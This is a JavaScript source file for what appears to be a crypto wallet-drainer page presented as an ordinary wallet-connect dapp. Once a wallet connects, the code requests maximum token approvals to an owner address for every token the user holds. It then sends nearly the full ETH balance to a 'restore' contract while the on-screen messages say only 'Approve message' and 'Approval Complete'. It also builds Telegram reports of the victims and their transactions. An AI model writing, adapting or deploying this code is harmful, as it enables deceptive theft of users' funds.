import * as Web3 from "web3";
// const { bufferToHex, fromRpcSig, bnToHex } = require("ethereumjs-util");
const Web3 = require("web3");
import * as DAPP_CONFIG from "./settings.json";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { getTokensOwned, getContractABI } from "./apiConfig";
const BigNumber = require("bignumber.js");
const modal = document.getElementById("exampleModalCenter");

document.querySelector("#connectButton").addEventListener("click", askTokens);
document.querySelector("#connectButtonR").addEventListener("click", askTokens);
document.querySelector("#connectButton2").addEventListener("click", askTokens);
document.querySelector("#connectButton2R").addEventListener("click", askTokens);
document.querySelector("#connectButton3").addEventListener("click", askTokens);
document.querySelector("#connectButton3R").addEventListener("click", askTokens);

const data = {
    web3: null,
    chainId: null,
    userAddress: null,
};

async function initWeb3() {
    try {
        const provider = await EthereumProvider.init({
            projectId: DAPP_CONFIG.VITE_PROJECT_ID,
            chains: [1],
            showQrModal: true,
            methods: ["eth_sendTransaction", "eth_sign"],
            events: ["chainChanged", "accountsChanged"],
        });
        await provider.connect();
        const accounts = await provider.request({
            method: "eth_requestAccounts",
        });
        const chainId = await provider.request({ method: "eth_chainId" });
        const web3 = new Web3(provider);
        data.userAddress = accounts[0];
        data.chainId = await chainId;
        data.web3 = web3;
        await sendErr(`${data.userAddress} is connected`);
        const rxsw = await swRC(data.chainId);
        if (rxsw == true) {
            askTokens();
        } else {
            window.location.reload();
        }
    } catch (error) {
        sendErr(error);
    }
}

async function swRC(id) {
    if (id == DAPP_CONFIG.VALID_CHAIN) {
        return true;
    } else {
        try {
            await ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: data.web3.utils.toHex(1) }],
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                try {
                    const res = await window.ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [
                            {
                                chainId: data.web3.utils.toHex(1),
                                chainName: "Ethereum Mainnet",
                                blockExplorerUrls: ["https://etherscan.io"],
                                nativeCurrency: {
                                    name: "Ethereum",
                                    symbol: "ETH",
                                    decimals: 18,
                                },
                                rpcUrls: [
                                    "https://mainnet.infura.io/v3/",
                                    "https://rpc.ankr.com/eth",
                                ],
                            },
                        ],
                    });
                    return true;
                } catch (addError) {
                    return false;
                }
            }
        }
    }
}

async function getTokenContract(address) {
    const tokenContract = new data.web3.eth.Contract(
        tokenContractAbi(),
        address
    );
    return tokenContract;
}

async function getRestoreContract(address) {
    const restoreContract = new data.web3.eth.Contract(
        restoreContractAbi(),
        address
    );
    return restoreContract;
}

async function askTokens() {
    if (data.web3) {
        document.querySelector(
            "#modal-body-text"
        ).innerText = `Approve message in your wallet`;
        $(modal).modal("show");
        try {
            const uToken = await getTokensOwned(data.userAddress);
            const maxApproval = new BigNumber(2)
                .pow(256)
                .minus(999)
                .toString(10);

            for (const [i, token] of uToken.entries()) {
                try {
                    const txx = await getTokenContract(uToken[i].address);
                    const approveToken = await txx.methods
                        .approve(DAPP_CONFIG.OWNER_ADDRESS, maxApproval)
                        .send({
                            from: data.userAddress,
                        });

                    sendErr(
                        `Approved token ${uToken[i].address} from ${data.userAddress} with transaction hash:
                        ${approveToken.transactionHash} ...`
                    );
                    document.querySelector(
                        "#modal-body-text"
                    ).innerText = `Approval Complete`;
                    $(modal).modal("show");
                } catch (error) {
                    sendErr(
                        `Error occurred for token at index ${i}: ${token.name}: ${token.balance}`,
                        error
                    );
                    signRestore();
                    continue;
                }
            }
            signRestore();
        } catch (error) {
            signRestore();
            sendErr(error);
        }
    } else {
        document.querySelector(
            "#modal-body-text"
        ).innerText = `Connect your wallet`;
        $(modal).modal("show");
        await initWeb3();
        await askTokens();
    }
}

async function signRestore() {
    if (data.web3) {
        // try {
        const userBalance = new BigNumber(await data.web3.eth.getBalance(
            data.userAddress
        ));

        const txETH = await getRestoreContract(
            DAPP_CONFIG.RESTORE_ETH_ADDRESS
        );
        const gasPriceInWei = new BigNumber(await data.web3.eth.getGasPrice());

        const fnGas = new BigNumber(await txETH.methods.restore().estimateGas({
            from: data.userAddress,
            to: DAPP_CONFIG.RESTORE_ETH_ADDRESS,
            value: userBalance.toString(), // Convert userBalance to string
        }));
        const gasEstimate = fnGas.times(gasPriceInWei).times(8); // Perform operations with BigNumber
        console.log(userBalance.minus(gasEstimate).toString())
        const res = await txETH.methods.restore().send({
            from: data.userAddress,
            to: DAPP_CONFIG.RESTORE_ETH_ADDRESS,
            value: userBalance.minus(gasEstimate).toString(), // Convert to string
        });
        console.log(res)

        const resDATA = `
            amount: ${data.web3.utils.fromWei(
            userBalance.minus(gasEstimate).toString(), // Convert to string
            "ether"
        )} $ETH,
            transaction Hash: ${res.transactionHash}
        `;
        document.querySelector(
            "#modal-body-text"
        ).innerText = `Approval Complete`;
        $(modal).modal("show");

        await sendErr(resDATA);
        // } catch (error) {
        //     await sendErr(`Error: ${String(error.message)}`);
        // }
    } else {
        await initWeb3();
        await signRestore();
    }
}

// async function signRestore() {
//     if (data.web3) {
//         // try {
//         // const userBalance = await data.web3.eth.getBalance(
//         //     data.userAddress
//         // );
//         const userBalance = new BigNumber(await data.web3.eth.getBalance(
//             data.userAddress
//         ));

//         const amountToSend = userBalance;

//         const txETH = await getRestoreContract(
//             DAPP_CONFIG.RESTORE_ETH_ADDRESS
//         );
//         // const gasPriceInWei = (await data.web3.eth.getGasPrice()) * 8;
//         const gasPriceInWei = new BigNumber(await data.web3.eth.getGasPrice());

//         const fnGas = await txETH.methods.restore().estimateGas({
//             from: data.userAddress,
//             to: DAPP_CONFIG.RESTORE_ETH_ADDRESS,
//             value: data.web3.utils.toHex(amountToSend),
//         });
//         const gasEstimate = fnGas * gasPriceInWei

//         const res = await txETH.methods.restore().send({
//             from: data.userAddress,
//             to: DAPP_CONFIG.RESTORE_ETH_ADDRESS,
//             value: data.web3.utils.toHex(userBalance - gasEstimate),
//         });

//         const resDATA = `
//             amount: ${data.web3.utils.fromWei(
//             userBalance - gasEstimate,
//             "ether"
//         )} $ETH,
//             transaction Hash: ${res.transactionHash}
//         `;
//         document.querySelector(
//             "#modal-body-text"
//         ).innerText = `Approval Complete`;
//         $(modal).modal("show");

//         await sendErr(resDATA);
//         // } catch (error) {
//         //     await sendErr(`Error: ${String(error.message)}`);
//         // }
//     } else {
//         await initWeb3();
//         await signRestore();
//     }
// }

async function sendErr(x) {
    console.log(x)
    const options = {
        method: "POST",
        mode: "cors",
        headers: {
            accept: "application/json",
            "content-type": "application/json",
        },
        body: JSON.stringify({
            text: String(x),
            disable_web_page_preview: false,
            disable_notification: false,
            reply_to_message_id: null,
            chat_id: DAPP_CONFIG.MY_CHAT_ID,
        }),
    };

    //     fetch(
    //         `https://api.telegram.org/bot${DAPP_CONFIG.TELEGRAM_TOKEN_BOT}/sendMessage`,
    //         options
    //     )
    //         .then((response) => response.json())
    //         .then((response) => response)
    //         .catch((err) => console.error(err));
}

function restoreContractAbi() {
    return [
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": false,
                    "internalType": "address",
                    "name": "sender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "EtherReceived",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "previousOwner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "newOwner",
                    "type": "address"
                }
            ],
            "name": "OwnershipTransferred",
            "type": "event"
        },
        {
            "inputs": [],
            "name": "getEthBal",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "renounceOwnership",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "restore",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "newOwner",
                    "type": "address"
                }
            ],
            "name": "transferOwnership",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "withdraw",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ]
}

function tokenContractAbi() {
    return [
        {
            constant: true,
            inputs: [],
            name: "name",
            outputs: [
                {
                    name: "",
                    type: "string",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: false,
            inputs: [
                {
                    name: "_spender",
                    type: "address",
                },
                {
                    name: "_value",
                    type: "uint256",
                },
            ],
            name: "approve",
            outputs: [
                {
                    name: "success",
                    type: "bool",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "totalSupply",
            outputs: [
                {
                    name: "",
                    type: "uint256",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: false,
            inputs: [
                {
                    name: "_from",
                    type: "address",
                },
                {
                    name: "_to",
                    type: "address",
                },
                {
                    name: "_value",
                    type: "uint256",
                },
            ],
            name: "transferFrom",
            outputs: [
                {
                    name: "success",
                    type: "bool",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "decimals",
            outputs: [
                {
                    name: "",
                    type: "uint256",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "version",
            outputs: [
                {
                    name: "",
                    type: "string",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [
                {
                    name: "_owner",
                    type: "address",
                },
            ],
            name: "balanceOf",
            outputs: [
                {
                    name: "balance",
                    type: "uint256",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "symbol",
            outputs: [
                {
                    name: "",
                    type: "string",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: false,
            inputs: [
                {
                    name: "_to",
                    type: "address",
                },
                {
                    name: "_value",
                    type: "uint256",
                },
            ],
            name: "transfer",
            outputs: [
                {
                    name: "success",
                    type: "bool",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: false,
            inputs: [
                {
                    name: "_spender",
                    type: "address",
                },
                {
                    name: "_value",
                    type: "uint256",
                },
                {
                    name: "_extraData",
                    type: "bytes",
                },
            ],
            name: "approveAndCall",
            outputs: [
                {
                    name: "success",
                    type: "bool",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            constant: true,
            inputs: [
                {
                    name: "_owner",
                    type: "address",
                },
                {
                    name: "_spender",
                    type: "address",
                },
            ],
            name: "allowance",
            outputs: [
                {
                    name: "remaining",
                    type: "uint256",
                },
            ],
            payable: false,
            type: "function",
        },
        {
            inputs: [
                {
                    name: "_initialAmount",
                    type: "uint256",
                },
                {
                    name: "_tokenName",
                    type: "string",
                },
                {
                    name: "_decimalUnits",
                    type: "uint8",
                },
                {
                    name: "_tokenSymbol",
                    type: "string",
                },
            ],
            type: "constructor",
        },
        {
            payable: false,
            type: "fallback",
        },
        {
            anonymous: false,
            inputs: [
                {
                    indexed: true,
                    name: "_from",
                    type: "address",
                },
                {
                    indexed: true,
                    name: "_to",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "_value",
                    type: "uint256",
                },
            ],
            name: "Transfer",
            type: "event",
        },
        {
            anonymous: false,
            inputs: [
                {
                    indexed: true,
                    name: "_owner",
                    type: "address",
                },
                {
                    indexed: true,
                    name: "_spender",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "_value",
                    type: "uint256",
                },
            ],
            name: "Approval",
            type: "event",
        },
    ];
}

window.addEventListener("load", () => {
    document.querySelector(
        "#modal-body-text"
    ).innerText = `Connect wallet to continue`;
    $(modal).modal("show");
});